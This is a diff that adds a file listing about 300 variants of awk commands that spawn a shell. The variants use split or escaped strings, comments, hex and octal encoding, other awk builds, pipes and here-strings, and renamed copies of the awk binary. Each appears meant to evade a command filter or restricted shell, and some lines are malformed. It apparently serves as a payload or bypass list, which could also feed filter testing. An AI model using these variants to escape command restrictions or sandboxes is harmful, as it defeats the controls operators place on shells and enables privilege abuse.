@@ -1,0 +1,301 @@
+awk 'BEGIN {system("/bin/"sh")}'
+awk 'BEGIN {system("/bi"n/sh)}'
+awk 'BEGIN {system("/bin/sh" "")}'
+awk 'BEGIN {system("/b""in/sh")}'
+awk 'BEGIN {system("/bin/s""h")}'
+awk 'BEGIN {system("/"bin/sh")}'
+awk 'BEGIN {system("/bin//sh")}'
+awk 'BEGIN {system("/bin/sh" )}'
+awk 'BEGIN {system("/bin/""sh")}'
+awk 'BEGIN {system("/bi""n/s""h")}'
+awk 'BEGIN {system("/b" "in" "/sh")}'
+awk 'BEGIN {system("/bin/sh"#)}'
+awk 'BEGIN {system("/bin/sh/*")}'
+awk 'BEGIN {system("/bin/sh\0")}'
+awk 'BEGIN {system("/bin/\sh")}'
+awk 'BEGIN {system("/bin/s\tsh")}'
+awk 'BEGIN {system("/bin/sh")#comment}'
+awk 'BEGIN {system("/bin/sh")/*insert*/}'
+awk 'BEGIN {system("/bin/sh" /*hack*/)}'
+awk 'BEGIN {system("/bin/"sh"")}'
+awk 'BEGIN {system("/bin" "/sh")}'
+awk 'BEGIN {system("/bi" "n/sh")}'
+awk 'BEGIN {system("/bin/sh" "\n")}'
+awk 'BEGIN {system("/bin" "//sh")}'
+awk 'BEGIN {system("/bin/sh" "//")}'
+awk 'BEGIN {system("/bin/sh" " ") }'
+awk 'BEGIN {system("/b\\in/sh")}'
+awk 'BEGIN {system("/bin\\sh")}'
+awk 'BEGIN {system("/bin/sh ")}'
+awk 'BEGIN {system("/bin/sh"/*bypass*/)}'
+awk 'BEGIN {system("/bin/sh" "\t")}'
+awk 'BEGIN {system("/b""in/""sh")}'
+awk 'BEGIN {system("/bin/" "sh")}'
+awk 'BEGIN {system("/bi\nn/sh")}'
+awk 'BEGIN {system("/bin/s\nh")}'
+awk 'BEGIN {system("/b\\in\\sh")}'
+awk 'BEGIN {system("/bin/sh\x00")}'
+awk 'BEGIN {system("/bin/sh" "\r")}'
+awk 'BEGIN {system("/bi\t\nn/s\rh")}'
+awk 'BEGIN {system("/bin/sh" "\x20")}'
+awk 'BEGIN {system("/bin/sh" "#injected")}'
+awk 'BEGIN {system("/bin" "/sh" "")}'
+awk 'BEGIN {system("/bin/sh" /*evasion*/) }'
+awk 'BEGIN {system("/bin/sh" /* obfuscated */)}'
+awk 'BEGIN {system("/bi""n/""sh" )}'
+awk 'BEGIN {system("/bin/sh" " ")#extra}'
+awk 'BEGIN {system("/bin/s\\h")}'
+awk 'BEGIN {system("/bi\\n/sh")}'
+awk 'BEGIN {system("/bin" + "/sh")}'
+awk 'BEGIN {system("/bi"+"n/sh")}'
+awk 'BEGIN {system("/bin/" + "sh")}'
+1. gawk 'BEGIN {system("/bin/sh")}'
+2. nawk 'BEGIN {system("/bin/sh")}'
+3. mawk 'BEGIN {system("/bin/sh")}'
+4. awk 'BEGIN {system("/bin/bash")}'
+5. awk 'BEGIN {system("/bin/dash")}'
+6. awk 'BEGIN {system("/bin/zsh")}'
+7. awk 'BEGIN {system("/bin/fish")}'
+8. gawk 'BEGIN {system("/bin/bash")}'
+9. nawk 'BEGIN {system("/bin/zsh")}'
+10. mawk 'BEGIN {system("/bin/dash")}'
+11. awk 'BEGIN {system("/usr/bin/sh")}'
+12. gawk 'BEGIN {system("/usr/bin/bash")}'
+13. awk 'BEGIN {system("/usr/local/bin/sh")}'
+14. awk 'BEGIN {system("/sbin/sh")}'
+15. awk 'BEGIN {system("/bin//sh")}'
+16. awk 'BEGIN {system("/bin/sh -i")}'
+17. gawk 'BEGIN {system("/bin/sh -i")}'
+18. nawk 'BEGIN {system("/bin/sh -i")}'
+19. awk 'BEGIN {system("/bin/sh")}'
+20. awk 'BEGIN {system('/bin/sh')}'
+21. awk "BEGIN {system('/bin/sh')}"
+22. awk "BEGIN {system("/bin/sh")}"
+23. awk "BEGIN {system('/bin/bash')}"
+24. gawk "BEGIN {system('/bin/zsh')}"
+25. nawk "BEGIN {system('/bin/dash')}"
+26. mawk "BEGIN {system('/bin/fish')}"
+27. awk 'BEGIN {system("/bin/sh");}'
+28. gawk 'BEGIN {system("/bin/sh");}'
+29. awk 'BEGIN {system("/bin\sh")}'
+30. awk 'BEGIN {system("/bin/sh ")}'
+31. awk 'BEGIN {system("/bin/sh >&2")}'
+32. gawk 'BEGIN {system("/bin/sh</dev/null")}'
+33. awk 'BEGIN {system("/bin/sh 0<&1")}'
+34. gawk 'BEGIN {system("/bin/sh 2>&1")}'
+35. nawk 'BEGIN {system("/bin/sh 1>&2")}'
+36. mawk 'BEGIN {system("/bin/sh #comment")}'
+37. gawk 'BEGIN {system("/bin/sh --norc")}'
+38. awk 'BEGIN {system("/bin/sh -c true")}'
+39. awk 'BEGIN {system("/bin/sh; echo OK")}'
+40. awk 'BEGIN {system("/bin/sh || true")}'
+41. gawk 'BEGIN {system("/bin/sh && true")}'
+42. mawk 'BEGIN {system("/bin/sh;#")}'
+43. nawk 'BEGIN {system("/bin/sh\t")}'
+44. awk 'BEGIN {system("/bin/sh ") #note}'
+45. awk 'BEGIN {system("/bin/sh | cat")}'
+46. awk 'BEGIN {system("/bin/sh && :")}'
+47. awk 'BEGIN {system("/bin/sh -s")}'
+48. awk 'BEGIN {system("/bin/sh --login")}'
+49. gawk 'BEGIN {system("/bin/sh --posix")}'
+50. awk 'BEGIN {system("/bin/sh -")}'
+1. `awk 'BEGIN{system("/bin/sh")}'`
+2. `awk BEGIN{system("/bin/sh")}`
+3. `awk 'BEGIN{system(/bin/sh)}'`
+4. `awk 'BEGIN {system(/bin/sh)}'`
+5. `awk BEGIN {system("/bin/sh")}`
+6. `awk 'BEGIN system("/bin/sh")'`
+7. `awk BEGIN system("/bin/sh")`
+8. `awk 'BEGIN{system("/bin/sh")`
+9. `awk BEGIN{system("/bin/sh")`
+10. `awk BEGIN system(/bin/sh)`
+11. `awk BEGIN{system(/bin/sh)}`
+12. `awk BEGIN system("/bin/sh"`
+13. `awk 'BEGIN{system "/bin/sh"}'`
+14. `awk 'BEGIN system("/bin/sh"}'`
+15. `awk 'BEGIN system /bin/sh'`
+16. `awk 'BEGIN {system /bin/sh}'`
+17. `awk 'BEGIN {system /bin/sh}'`
+18. `awk BEGIN {system /bin/sh}`
+19. `awk 'BEGIN system /bin/sh'`
+20. `awk BEGIN system /bin/sh`
+21. `awk 'BEGIN{system"/bin/sh"}'`
+22. `awk BEGIN{system"/bin/sh"}`
+23. `awk BEGIN{system "/bin/sh"}`
+24. `awk BEGIN system"/bin/sh"`
+25. `awk 'BEGIN system"/bin/sh"'`
+26. `awk 'BEGIN{system "/bin/sh"}'`
+27. `awk 'BEGIN{system "/bin/sh"}'`
+28. `awk 'BEGIN { system("/bin/sh") }'`
+29. `awk BEGIN { system("/bin/sh") }`
+30. `awk 'BEGIN {system("/bin/sh")}'`
+31. `awk 'BEGIN{ system("/bin/sh") }'`
+32. `awk 'BEGIN{system("/bin/sh");}'`
+33. `awk 'BEGIN{system("/bin/sh")}'`
+34. `awk 'BEGIN{system("/bin/sh")}'`
+35. `awk 'BEGIN{system("/bin/sh")}'`
+36. `awk 'BEGIN{system("/bin/sh")}'`
+37. `awk 'BEGIN { system("/bin/sh") }'`
+38. `awk 'BEGIN{ system("/bin/sh") }'`
+39. `awk 'BEGIN {system "/bin/sh"}'`
+40. `awk BEGIN{system "/bin/sh"}`
+41. `awk BEGIN system "/bin/sh"`
+42. `awk 'BEGIN{system "/bin/sh"}'`
+43. `awk 'BEGIN system "/bin/sh"'`
+44. `awk 'BEGIN {system "/bin/sh"}'`
+45. `awk 'BEGIN system("/bin/sh")'`
+46. `awk BEGIN system("/bin/sh")`
+47. `awk 'BEGIN system /bin/sh'`
+48. `awk BEGIN system /bin/sh`
+49. `awk 'BEGIN{system "/bin/sh"}'`
+50. `awk BEGIN{system "/bin/sh"}`
+1. `awk 'BEGIN {system("/bin/sh")}'`
+2. `awk 'BEGIN {system("/bin/sh")}'`
+3. `'BEGIN {system("/bin/sh")}' awk`
+4. `'BEGIN {system("/bin/sh")}' | awk`
+5. `awk -v x='BEGIN {system("/bin/sh")}' "$x"`
+6. `echo 'BEGIN {system("/bin/sh")}' | awk`
+7. `awk '{if(NR==1) system("/bin/sh")}' <<< "run"`
+8. `awk 'BEGIN {system("/bin/sh")}' </dev/null`
+9. `printf 'BEGIN {system("/bin/sh")}\n' | awk`
+10. `awk 'BEGIN {system("/bin/sh")}'<<<""`
+11. `cat /dev/null | awk 'BEGIN {system("/bin/sh")}'`
+12. `awk <<< 'BEGIN {system("/bin/sh")}'`
+13. `true | awk 'BEGIN {system("/bin/sh")}'`
+14. `awk 'BEGIN {"/bin/sh" | getline x; close("/bin/sh")}'`
+15. `awk <<<BEGIN'{system("/bin/sh")}'`
+16. `awk<<<'BEGIN{system("/bin/sh")}'`
+17. `:|awk 'BEGIN {system("/bin/sh")}'`
+18. `awk 'BEGIN {system("/bin/sh")}' <<EOF`
+19. `bash -c 'awk "BEGIN {system(\"/bin/sh\")}"'`
+20. `awk <<<"BEGIN {system(\"/bin/sh\")}"`
+21. `echo BEGIN {system(\"/bin/sh\")} | awk`
+22. `awk 'BEGIN {system("/bin/sh")}' | cat`
+23. `awk 'BEGIN {system("/bin/sh")}' | tee /dev/null`
+24. `awk 'BEGIN {system("/bin/sh")}' && echo`
+25. `awk 'BEGIN {system("/bin/sh")}' &`
+26. `awk 'BEGIN {system("/bin/sh")}' & wait`
+27. `awk 'BEGIN {system("/bin/sh")}' && true`
+28. `awk -W interactive 'BEGIN {system("/bin/sh")}'`
+29. `env CMD='system("/bin/sh")' awk 'BEGIN {ENVIRON["CMD"]}'`
+30. `awk 'BEGIN {a="/bin/sh"; system(a)}'`
+31. `awk 'BEGIN {s="sh"; system("/bin/"s)}'`
+32. `awk 'BEGIN {s="/"; t="bin"; u="sh"; system(s t "/" u)}'`
+33. `awk 'BEGIN {s="/bin/sh"; system(s)}'`
+34. `awk 'BEGIN {c="system"; c("/bin/sh")}'`
+35. `awk 'BEGIN {a="/bin"; b="/sh"; system(a b)}'`
+36. `awk 'BEGIN {cmd="/bin/sh"; system(cmd)}'`
+37. `awk 'BEGIN {system("/bin/sh" "")}'`
+38. `awk 'BEGIN {system(sprintf("%s","/bin/sh"))}'`
+39. `awk 'BEGIN {system("/bin/sh" "\x00")}'`
+40. `awk 'BEGIN {sys=system; sys("/bin/sh")}'`
+41. `awk 'BEGIN {if(1) system("/bin/sh")}'`
+42. `awk 'BEGIN {while(!system("/bin/sh")) break}'`
+43. `awk 'BEGIN {exit system("/bin/sh")}'`
+44. `awk 'BEGIN {for(i=0;i<1;i++) system("/bin/sh")}'`
+45. `awk 'BEGIN {a="/bin/";b="sh";system(a b)}'`
+46. `awk 'BEGIN {s="/bin/sh";x=system;x(s)}'`
+47. `awk 'BEGIN {system("/bin/sh");exit}'`
+48. `awk 'BEGIN {s="/bin/sh";while(1) {system(s);break}}'`
+49. `awk 'BEGIN {s="/bin/sh";system(s);}'`
+50. `awk 'BEGIN {s="/bin/sh";if(length(s)) system(s)}'`
+1. `awk 'BEGIN {system("/bin/sh")}'`
+2. `awk 'BEGIN {system("/bin/sh") }'`
+3. `awk 'BEGIN {system("/b\x69n/sh")}'`
+4. `awk 'BEGIN {system("/b\141sh")}'`
+5. `awk 'BEGIN {system("/bin" "/sh")}'`
+6. `awk 'BEGIN {system(sprintf("%s", "/bin/sh"))}'`
+7. `awk 'BEGIN {s="/bin/sh"; system(s)}'`
+8. `awk 'BEGIN{system("/b\105n/sh")}'`
+9. `awk 'BEGIN {system("/bi""n/sh")}'`
+10. `awk 'BEGIN{cmd="/bin/sh"; system(cmd)}'`
+11. `awk 'BEGIN{system("\x2f\x62\x69\x6e\x2f\x73\x68")}'`
+12. `awk 'BEGIN{system(char(47) "bin/sh")}'`
+13. `awk 'BEGIN{system("/bin/" "sh")}'`
+14. `awk 'BEGIN{system("/b""in/sh")}'`
+15. `awk 'BEGIN{system("/bin/s""h")}'`
+16. `awk 'BEGIN{cmd="/bin/sh"; system(cmd)}'`
+17. `awk 'BEGIN{system("/bin/sh" "")}'`
+18. `awk 'BEGIN{system("/b" "in/" "sh")}'`
+19. `awk 'BEGIN{system("/bin" substr("/sh",0))}'`
+20. `awk 'BEGIN{system("/b\x69\x6e/sh")}'`
+21. `awk 'BEGIN{system("\057\142\151\156\057\163\150")}'`
+22. `awk 'BEGIN{system("/bin/sh"#comment)}'`
+23. `awk 'BEGIN{system("/bin/sh"/*noop*/)}'`
+24. `awk 'BEGIN{system("/bin//sh")}'`
+25. `awk 'BEGIN{system("/bi/../bin/sh")}'`
+26. `awk 'BEGIN{system("/bin/sh" ORS)}'`
+27. `awk 'BEGIN{system("/bin/sh" "")}'`
+28. `awk 'BEGIN{system("/bin" sprintf("%s", "/sh"))}'`
+29. `awk 'BEGIN{cmd="/bin/sh"; system(cmd FS "")}'`
+30. `awk 'BEGIN{system("/bi" "n/sh")}'`
+31. `awk 'BEGIN{system("/bi""n/""sh")}'`
+32. `awk 'BEGIN{system("/bin/sh\x00")}'`
+33. `awk 'BEGIN{system("/bin/sh" "\n")}'`
+34. `awk 'BEGIN{system("/bin/" "sh" "")}'`
+35. `awk 'BEGIN{system("/bin/" tolower("SH"))}'`
+36. `awk 'BEGIN{cmd="/bin/sh"; print cmd |& "/bin/sh"}'`
+37. `awk 'BEGIN{system(ENVIRON["SHELL"])}'`
+38. `awk 'BEGIN{sys="/bin/sh"; system(sys)}'`
+39. `awk 'BEGIN{a="/bin";b="/sh";system(a b)}'`
+40. `awk 'BEGIN{a=47 b=98 c=105 d=110 e=47 f=115 g=104; cmd=sprintf("%c%c%c%c%c%c%c",a,b,c,d,e,f,g); system(cmd)}'`
+41. `awk 'BEGIN{system("/bin/sh\0")}'`
+42. `awk 'BEGIN{system("/bin/sh\t")}'`
+43. `awk 'BEGIN{cmd="/bin/sh"; if(length(cmd)) system(cmd)}'`
+44. `awk 'BEGIN{if(1){system("/bin/sh")}}'`
+45. `awk 'BEGIN{(system)("/bin/sh")}'`
+46. `awk 'BEGIN{system("/b" "in" "/" "sh")}'`
+47. `awk 'BEGIN{system("/bin" "/" "sh")}'`
+48. `awk 'BEGIN{cmd="/bin/sh"; system(cmd "")}'`
+49. `awk 'BEGIN{system("/bin/sh\072")}'`
+50. `awk 'BEGIN{system("/bin/sh\012")}'`
+1. `cp $(which awk) /tmp/t; /tmp/t 'BEGIN {system("/bin/sh")}'`
+2. `cp /usr/bin/awk /tmp/x; /tmp/x 'BEGIN {system("/bin/sh")}'`
+3. `cp /bin/awk ./a; ./a 'BEGIN {system("/bin/sh")}'`
+4. `install /usr/bin/awk /tmp/b; /tmp/b 'BEGIN {system("/bin/sh")}'`
+5. `ln /bin/awk /tmp/h; /tmp/h 'BEGIN {system("/bin/sh")}'`
+6. `ln -s $(which awk) ./j; ./j 'BEGIN {system("/bin/sh")}'`
+7. `cp $(command -v awk) ./q; ./q 'BEGIN {system("/bin/sh")}'`
+8. `cp $(which gawk) /tmp/a1; /tmp/a1 'BEGIN {system("/bin/sh")}'`
+9. `cp /usr/bin/gawk /tmp/a2; /tmp/a2 'BEGIN {system("/bin/sh")}'`
+10. `cp /bin/gawk ./a3; ./a3 'BEGIN {system("/bin/sh")}'`
+11. `install /usr/bin/gawk /tmp/a4; /tmp/a4 'BEGIN {system("/bin/sh")}'`
+12. `ln /bin/gawk /tmp/a5; /tmp/a5 'BEGIN {system("/bin/sh")}'`
+13. `cp $(command -v gawk) ./a6; ./a6 'BEGIN {system("/bin/sh")}'`
+14. `cp $(which mawk) /tmp/m1; /tmp/m1 'BEGIN {system("/bin/sh")}'`
+15. `cp /usr/bin/mawk /tmp/m2; /tmp/m2 'BEGIN {system("/bin/sh")}'`
+16. `cp /bin/mawk ./m3; ./m3 'BEGIN {system("/bin/sh")}'`
+17. `install /usr/bin/mawk /tmp/m4; /tmp/m4 'BEGIN {system("/bin/sh")}'`
+18. `ln /bin/mawk /tmp/m5; /tmp/m5 'BEGIN {system("/bin/sh")}'`
+19. `cp $(command -v mawk) ./m6; ./m6 'BEGIN {system("/bin/sh")}'`
+20. `cp $(which nawk) /tmp/n1; /tmp/n1 'BEGIN {system("/bin/sh")}'`
+21. `cp /usr/bin/nawk /tmp/n2; /tmp/n2 'BEGIN {system("/bin/sh")}'`
+22. `cp /bin/nawk ./n3; ./n3 'BEGIN {system("/bin/sh")}'`
+23. `install /usr/bin/nawk /tmp/n4; /tmp/n4 'BEGIN {system("/bin/sh")}'`
+24. `ln /bin/nawk /tmp/n5; /tmp/n5 'BEGIN {system("/bin/sh")}'`
+25. `cp $(command -v nawk) ./n6; ./n6 'BEGIN {system("/bin/sh")}'`
+26. `cp /usr/bin/awk /dev/shm/ax; /dev/shm/ax 'BEGIN {system("/bin/sh")}'`
+27. `cp /usr/bin/awk /tmp/.awk; /tmp/.awk 'BEGIN {system("/bin/sh")}'`
+28. `cp /usr/bin/awk /tmp/shellcaller; /tmp/shellcaller 'BEGIN {system("/bin/sh")}'`
+29. `cp /usr/bin/awk /var/tmp/x; /var/tmp/x 'BEGIN {system("/bin/sh")}'`
+30. `cp /usr/bin/awk ./awk1; ./awk1 'BEGIN {system("/bin/sh")}'`
+31. `cp /usr/bin/awk ./runawk; ./runawk 'BEGIN {system("/bin/sh")}'`
+32. `cp /usr/bin/awk ./cmd; ./cmd 'BEGIN {system("/bin/sh")}'`
+33. `cp /usr/bin/awk ./util; ./util 'BEGIN {system("/bin/sh")}'`
+34. `cp /usr/bin/awk ./x123; ./x123 'BEGIN {system("/bin/sh")}'`
+35. `cp /usr/bin/awk ./zzz; ./zzz 'BEGIN {system("/bin/sh")}'`
+36. `cp /usr/bin/awk ./starter; ./starter 'BEGIN {system("/bin/sh")}'`
+37. `cp /usr/bin/awk ./dotcmd; ./dotcmd 'BEGIN {system("/bin/sh")}'`
+38. `cp /usr/bin/awk ./bin.fake; ./bin.fake 'BEGIN {system("/bin/sh")}'`
+39. `cp /usr/bin/awk ./hidden; ./hidden 'BEGIN {system("/bin/sh")}'`
+40. `cp /usr/bin/awk ./_a; ./_a 'BEGIN {system("/bin/sh")}'`
+41. `cp /usr/bin/awk ./z_; ./z_ 'BEGIN {system("/bin/sh")}'`
+42. `cp /usr/bin/awk ./boot; ./boot 'BEGIN {system("/bin/sh")}'`
+43. `cp /usr/bin/awk ./core; ./core 'BEGIN {system("/bin/sh")}'`
+44. `cp /usr/bin/awk ./net; ./net 'BEGIN {system("/bin/sh")}'`
+45. `cp /usr/bin/awk ./sys; ./sys 'BEGIN {system("/bin/sh")}'`
+46. `cp /usr/bin/awk ./lsd; ./lsd 'BEGIN {system("/bin/sh")}'`
+47. `cp /usr/bin/awk ./get; ./get 'BEGIN {system("/bin/sh")}'`
+48. `cp /usr/bin/awk ./push; ./push 'BEGIN {system("/bin/sh")}'`
+49. `cp /usr/bin/awk ./shellify; ./shellify 'BEGIN {system("/bin/sh")}'`
+50. `cp /usr/bin/awk ./runtime; ./runtime 'BEGIN {system("/bin/sh")}'`
